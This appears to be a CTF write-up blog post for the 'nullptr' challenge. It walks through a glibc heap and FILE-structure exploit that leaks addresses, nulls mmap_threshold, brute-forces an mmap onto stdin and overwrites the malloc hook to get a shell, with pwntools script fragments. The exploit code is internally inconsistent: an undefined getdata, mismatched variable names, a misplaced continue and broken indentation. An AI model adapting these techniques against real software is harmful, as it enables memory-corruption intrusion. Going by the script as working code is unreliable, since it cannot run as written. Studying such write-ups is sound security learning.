@@ -1,0 +1,213 @@
+I"�`<p><strong>tl;dr</strong></p>
+
+<ul>
+  <li>Overwrite <code class="language-plaintext highlighter-rouge">mmap_threshold</code> with null and trim top chunk size.</li>
+  <li>Null out last 2 bytes of stdin’s <code class="language-plaintext highlighter-rouge">_IO_buf_base</code> and brute force to get allocation on stdin.</li>
+  <li>Overwrite one of the jump tables with win function to get shell.</li>
+</ul>
+
+<!--more-->
+
+<p><strong>Challenge Points:</strong> 453
+**Solves: ** 4</p>
+
+<p>We had a really great time this weekend with this year’s edition of Alles CTF. I spent most of my time working on the challenge nullptr and in this post , I’ll be discussing the intended solution for the challenge.</p>
+
+<p><strong>PS:</strong> We could not solve this during the CTF but the exploit idea is worth sharing.</p>
+
+<h2 id="challenge-description">Challenge description</h2>
+
+<p>To begin with , we’d been provided with a pretty simple c source code which has 2 functionalities.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">get_me_out_of_this_mess</span><span class="p">()</span> <span class="p">{</span> <span class="n">execl</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span> <span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">addr</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">menuchoice</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[1. view, 2. null, -1. exit]&gt; </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+        <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">menuchoice</span><span class="p">);</span> <span class="n">getc</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
+        <span class="k">switch</span> <span class="p">(</span><span class="n">menuchoice</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"view address&gt; </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+            <span class="n">scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">);</span> <span class="n">getc</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"%p: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="o">**</span><span class="p">)</span><span class="n">addr</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"nuke address&gt; </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+            <span class="n">scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">);</span> <span class="n">getc</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
+            <span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="o">**</span><span class="p">)</span><span class="n">addr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"ok!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="k">case</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"bye!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="nl">default:</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<ol>
+  <li>The view function prints the content of an address passed , hence we can be assured of all leaks ;).</li>
+  <li>The nuke function nulls out the content of an address passed.</li>
+</ol>
+
+<p>Looks pretty simple doesn’t it?</p>
+
+<h2 id="getting-necessary-leaks">Getting necessary leaks</h2>
+
+<p>Getting all required leaks is nothing but a trivial task.</p>
+
+<p>Initially, we can directly get stack leak by passing any <code class="language-plaintext highlighter-rouge">non-numeric</code> value to scanf. Let’s script it a bit.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">'dwadwda'</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">123</span>
+<span class="n">LIBC</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">,</span><span class="n">checksec</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">):</span>
+        <span class="n">io</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span><span class="n">PORT</span><span class="p">)</span>
+        <span class="n">context</span><span class="p">.</span><span class="n">noptrace</span><span class="o">=</span><span class="bp">True</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">io</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">'./nullptr'</span><span class="p">,</span><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LD_PRELOAD"</span> <span class="p">:</span> <span class="s">"./libc.so.6"</span><span class="p">})</span>
+
+    <span class="n">reu</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+    <span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="n">rel</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+    <span class="n">re</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">null</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">']&gt; </span><span class="se">\n</span><span class="s">'</span><span class="p">,</span><span class="s">'2'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">'nuke address&gt; </span><span class="se">\n</span><span class="s">'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
+
+    <span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">libc</span><span class="p">):</span>
+        <span class="n">base</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1ea9b8</span>
+        <span class="n">null</span><span class="p">(</span><span class="n">base</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">']&gt; </span><span class="se">\n</span><span class="s">'</span><span class="p">,</span><span class="s">'1'</span><span class="p">)</span>
+        <span class="n">reu</span><span class="p">(</span><span class="s">'address&gt; </span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+        <span class="n">s</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+        <span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+        <span class="n">libc</span> <span class="o">=</span> <span class="n">getdata</span><span class="p">(</span><span class="n">stack</span><span class="o">-</span><span class="mh">0xd8</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x271e3</span>
+        <span class="n">code</span> <span class="o">=</span> <span class="n">getdata</span><span class="p">(</span><span class="n">stack</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10ce</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'stack = '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'libc = '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">))</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'code = '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">code</span><span class="p">))</span>
+</code></pre></div></div>
+
+<h2 id="idea-of-exploitation">Idea of exploitation</h2>
+
+<p>After carefully analyzing scanf’s source code, sherl0ck came up with the idea of calling <strong>malloc</strong> again by <code class="language-plaintext highlighter-rouge">nulling</code> out <code class="language-plaintext highlighter-rouge">IO_buf_base</code>.</p>
+
+<p>In the depths of scanf ,there resides a function called IO_doallocbuf.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="cm">/* Maybe we already have a push back pointer.  */</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+	<span class="p">{</span>
+	  <span class="n">free</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span><span class="p">);</span>
+	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">_IO_IN_BACKUP</span><span class="p">;</span>
+	<span class="p">}</span>
+      <span class="n">_IO_doallocbuf</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+    <span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>The code is actually of the caller function of <code class="language-plaintext highlighter-rouge">_IO_doallocbuf</code> which is <code class="language-plaintext highlighter-rouge">_IO_new_file_underflow</code>.</p>
+
+<p>It calls malloc with a fixed size of <code class="language-plaintext highlighter-rouge">blk_sizet</code> which is by default 0x1000 bytes.</p>
+
+<p>From this point on , we were stuck , we tried nulling out the last 2 bytes of buf base in the hope of getting allocation at tcache structure , from there on we faked a 0x400 size arbitrary chunk in tcache and found another way to call malloc with size of 0x400 from stdout structure.</p>
+
+<p>Well , getting allocation with stdout doesn’t actually give us arbitrary write.</p>
+
+<h2 id="the-intended-solution">The intended solution</h2>
+
+<p>Well , the intended solution is actually leveraging an mmap call from malloc. Let’s see how this can be done.</p>
+
+<ul>
+  <li>Nulling out <code class="language-plaintext highlighter-rouge">mmap_threshold</code> with triggers a different code path in malloc.</li>
+  <li>Also , trimming top size by writing null misaligned finally calls mmap when malloc is invoked.</li>
+</ul>
+
+<p>Now , all that we have to do is , brute force until an mmap happens near our stdin file structure and from there on , its a game over.</p>
+
+<p>Let’s take our script forward.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="n">buf_base</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1ea9b8</span>
+        <span class="n">input_buffer</span> <span class="o">=</span> <span class="n">getdata</span><span class="p">(</span><span class="n">buf_base</span><span class="p">)</span>
+        <span class="n">TARGET_REGION</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1ea000</span>
+        <span class="n">TARGET_HOOK_OFFSET</span> <span class="o">=</span> <span class="mh">0xb70</span>
+        <span class="n">TARGET_STDIN_OFFSET</span> <span class="o">=</span> <span class="mh">0x980</span>
+        <span class="n">_IO_2_1_stdin_</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_IO_2_1_stdin_'</span><span class="p">]</span>
+        <span class="n">mmap_threshold_</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1ea280</span>
+        <span class="n">MAIN_ARENA_TOP_CHUNK_PTR</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1eabe0</span>
+        <span class="n">top_chunk</span> <span class="o">=</span> <span class="n">getdata</span><span class="p">(</span><span class="n">MAIN_ARENA_TOP_CHUNK_PTR</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span>
+        <span class="n">_IO_stdfile_0_lock</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1ed4d0</span>
+        <span class="n">__GI__IO_file_jumps</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1ec4a0</span>
+        <span class="n">MASK</span> <span class="o">=</span> <span class="mh">0xffffffffffff0000</span>
+        <span class="k">if</span> <span class="n">TARGET_REGION</span> <span class="o">&amp;</span> <span class="n">MASK</span> <span class="o">!=</span> <span class="n">TARGET_REGION</span><span class="p">:</span>
+            <span class="n">log</span><span class="p">.</span><span class="n">failure</span><span class="p">(</span><span class="s">"Restart exploit"</span><span class="p">)</span>
+            <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="k">continue</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">break</span>
+       <span class="c1">#Null out top chunk partially keeping the inuse bit
+</span>       <span class="c1">#Null out mmap_threshold and next malloc should call mmap
+</span>       <span class="n">null</span><span class="p">(</span><span class="n">mmap_threshold</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> 
+       <span class="n">null</span><span class="p">(</span><span class="n">top_chunk</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+
+       <span class="c1"># malloc will now be mmap!
+</span>       <span class="c1"># We keep calling mmap from malloc and bruteforce for getting allocation at stdin
+</span>       <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">200</span><span class="p">):</span>
+           <span class="n">malloc</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+           <span class="n">input_buffer</span> <span class="o">=</span> <span class="n">getdata</span><span class="p">(</span><span class="n">_IO_2_1_stdin_</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>
+           <span class="k">if</span> <span class="p">(</span><span class="n">input_buffer</span> <span class="o">&amp;</span> <span class="n">MASK</span><span class="p">)</span> <span class="o">==</span> <span class="n">TARGET_REGION</span><span class="p">:</span>
+               <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'Hit'</span><span class="p">)</span>
+               <span class="k">break</span>
+
+      
+</code></pre></div></div>
+
+<p>Once there’s a hit , all that’s left is to partially overwrite <code class="language-plaintext highlighter-rouge">IO_buf_base</code> and get allocation on stdin. Here , after getting allocation on stdin , we intend to overwrite malloc hook to get shell.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="c1">#Now we partially overwrite io buf base of stdin
+</span>        <span class="n">null</span><span class="p">(</span><span class="n">_IO_2_1_stdin_</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">7</span> <span class="o">-</span> <span class="mi">6</span><span class="p">)</span>
+        <span class="n">_s</span> <span class="o">=</span> <span class="n">TARGET_STDIN_OFFSET</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad2088</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">TARGET_REGION</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">5</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">_IO_stdfile_0_lock</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">__GI__IO_file_jumps</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">TARGET_HOOK_OFFSET</span><span class="p">,</span><span class="s">'x'</span><span class="p">)</span>
+
+        <span class="n">sla</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+        <span class="c1">#overwritten malloc hook
+</span>        <span class="c1">#call malloc to get shell
+</span>        <span class="n">malloc</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+        <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<h3 id="an-alternative-approach">An alternative approach</h3>
+
+<p>We could be all lazy and let brute force do the work. A simpler yet time consuming approach would be to overwrite the last 3 bytes of stdin’s <code class="language-plaintext highlighter-rouge">IO_buf_base</code> and wait for the magic to happen. Eventually , in one of the runs , it would match with binary bss and you get a direct write to GOT table.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>The challenge had really intersting concepts involved and we learnt quite alot. Kudos to the author Mrmaxmeier for the awesome challenge.</p>
+
+<p>Here’s the original script of the author - <a href="https://gist.github.com/Mrmaxmeier/830561d4a732b0af24bf29d685a9f74f">Link</a></p>
+
+:ET
